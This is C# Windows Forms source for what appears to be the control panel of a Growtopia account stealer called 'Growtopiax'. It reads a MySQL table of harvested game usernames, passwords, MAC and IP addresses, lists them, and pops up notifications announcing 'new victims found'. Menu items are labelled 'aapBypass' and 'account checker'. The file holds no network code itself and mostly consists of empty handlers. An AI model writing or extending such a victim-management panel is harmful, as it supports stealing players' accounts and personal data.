using Growtopiax.Extensions;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySql.Data.MySqlClient;
using System.Runtime.Serialization;


namespace Growtopiax
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        MySqlConnection baglanti = new MySqlConnection("Server=localhost; Database=growtopiax; Uid=root; Pwd=");

        //Mysql Setup
        //Mysql Setup
        static string conString = "Server=localhost; Database=growtopiax; Uid=root; Pwd=";
        MySqlConnection con = new MySqlConnection(conString);
        MySqlCommand cmd;

        private ContextMenuStrip contextmenustrip1 = new ContextMenuStrip();


        public string BalloonTipTitle { get; set; }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        private string serial = "altanb12345";
        private int newsize;
        private int oldsize;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void DragMove(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void darkLabel1_Click(object sender, EventArgs e)
        {

        }

        private void betaToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void youtubeToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void growtopiaxToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void Main_Load(object sender, EventArgs e)
        {
        }

        private void madeByAltanb3601ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void darkMenuStrip2_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
        }

        private void rgb03_Paint(object sender, PaintEventArgs e)
        {
        }

        private void timer4_Tick(object sender, EventArgs e)
        {

        }

        private void betaToolStripMenuItem_Click_1(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            this.darkLabel5.Text = "Status: Receiving Data.. (Updating Account(s) Data)";
            Thread.Sleep(600);
            {
                listBox2.Items.Clear();
                baglanti.Open();
                MySqlCommand komut = new MySqlCommand("select *from dbaltanb12345", baglanti);
                MySqlDataReader read = komut.ExecuteReader();
                while (read.Read())
                {
                    this.listBox2.Items.Clear();
                    this.listBox2.Items.Add("ID        GrowID        Password            Mac            IP Address ");
                    listBox2.Items.Add(read[0] + "            " + read[1] + "   " + read[2] + "      " + read[3] + "           " + read[4]);
                }
                this.darkLabel5.Text = "All Accounts Checked!)";
                baglanti.Close();
            }
            List<string> lines = new List<string>();
            this.newsize = this.listBox2.Items.Count;
            if (this.newsize > this.oldsize)
            {
                this.oldsize = this.newsize;
                this.notifyIcon1.BalloonTipTitle = "Growtopiax vBeta";
                this.notifyIcon1.BalloonTipText = "There are some new victims found\nhave fun!";
                this.notifyIcon1.Visible = true;
                this.notifyIcon1.ShowBalloonTip(1000);
            }
            else
            {
                this.notifyIcon1.BalloonTipTitle = "Growtopiax vBeta";
                this.notifyIcon1.BalloonTipText = "Client check was successfull\nbut there are no new clients have fun!";
                this.notifyIcon1.Visible = true;
                this.notifyIcon1.ShowBalloonTip(1000);
            }
            int i;
            i = 0;
            Control control = this.label1;
            string[] array2 = new string[5];
            array2[0] = "Selected (";
            int num = 1;
            i = this.listBox2.Items.Count;
            array2[num] = i.ToString();
            array2[2] = "/";
            int num2 = 3;
            i = this.listBox2.Items.Count;
            array2[num2] = i.ToString();
            array2[4] = ")";
            control.Text = string.Concat(array2);
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            retrive();
        }

        private void aapBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                listBox2.Items.Add("Growid");
                listBox2.Items.Add("Password");
                listBox2.Items.Add("Lastworld");
            }
            if (listView1.SelectedItems.Count > 1)
            {
                listBox2.Items.Add("Growid");
                listBox2.Items.Add("Password");
                listBox2.Items.Add("Lastworld");
            }
            if (listView1.SelectedItems.Count > 2)
            {
                listBox2.Items.Add("Growid");
                listBox2.Items.Add("Password");
                listBox2.Items.Add("Lastworld");
            }


        }

        private void retrive()
        {
            cmd = con.CreateCommand();
            cmd.CommandText = "SELECT * FROM dbaltanb12345";

            try
            {
                con.Open();
                MySqlDataReader Reader = cmd.ExecuteReader();
                listView1.Items.Clear();

                while (Reader.Read())
                {
                    ListViewItem lv = new ListViewItem(Reader.GetInt32(0).ToString());
                    lv.SubItems.Add(Reader.GetString(6));
                    lv.SubItems.Add(Reader.GetString(7));
                    lv.SubItems.Add(Reader.GetString(8));
                    lv.SubItems.Add(Reader.GetString(2));
                    lv.SubItems.Add(Reader.GetString(3));
                    listView1.Items.Add(lv);
                }

                Reader.Close();
                cmd.Dispose();
                con.Close();

            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
        }


        private void accountCheckerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listBox2.Items.Clear();
            baglanti.Open();
            MySqlCommand komut = new MySqlCommand("select *from dbaltanb12345", baglanti);
            MySqlDataReader read = komut.ExecuteReader();
            while (read.Read())
            {
                listBox2.Items.Add      (   read[0] +"            "+read[1]+"   "+read[2]+"      "+read[3]+"           "+read[4]+"           "+read[5]);
            }
            baglanti.Close();
        }

        private void exportToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.notifyIcon1.BalloonTipTitle = "Growtopiax vBeta";
            this.notifyIcon1.BalloonTipText = "There are some new victims found\nhave fun!";
            this.notifyIcon1.Visible = true;
            this.notifyIcon1.ShowBalloonTip(1000);
        }

        
        private void closeForwarderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void darkLabel5_Click(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            WindowState = FormWindowState.Normal;
        }

        private void minimizeB_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            if (FormWindowState.Minimized == WindowState)
            {
                notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
                notifyIcon1.BalloonTipText = "Bilzzdirssaim iasdçessrği";
                notifyIcon1.BalloonTipTitle = "Bildsdiasrssim zzbazxsgsdazşlzzığı";
                notifyIcon1.Text = "Bildirim Tezaaaxt";
                notifyIcon1.Visible = true;
                notifyIcon1.ShowBalloonTip(30000);
            }
            else
            {
                notifyIcon1.Visible = false;
            }

        }

        private void exitB_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Growtopiax form = new Growtopiax();
            form.ShowDialog();
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {

        }

        private void listBox3_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Right)
            {
                ListView listView = sender as ListView;
                if (e.Button == System.Windows.Forms.MouseButtons.Right)
                {
                    ListViewItem item = listView.GetItemAt(e.X, e.Y);
                    if (item != null)
                    {
                        item.Selected = true;
                        contextmenustrip1.Show(listView, e.Location);
                    }
                }
                ContextMenu contextMenu = new System.Windows.Forms.ContextMenu();
                MenuItem menuItem = new MenuItem("Cut");
                contextMenu.MenuItems.Add(menuItem);
                menuItem = new MenuItem("Copy");
                contextMenu.MenuItems.Add(menuItem);
                menuItem = new MenuItem("Paste");
                contextMenu.MenuItems.Add(menuItem);
            }
        }




        private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }


        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            retrive();
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            retrive();
        }

        private void vScrollBar1_Click(object sender, EventArgs e)
        {

        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {

        }

        private void contextMenuStrip5_Opening(object sender, CancelEventArgs e)
        {

        }
    }
}
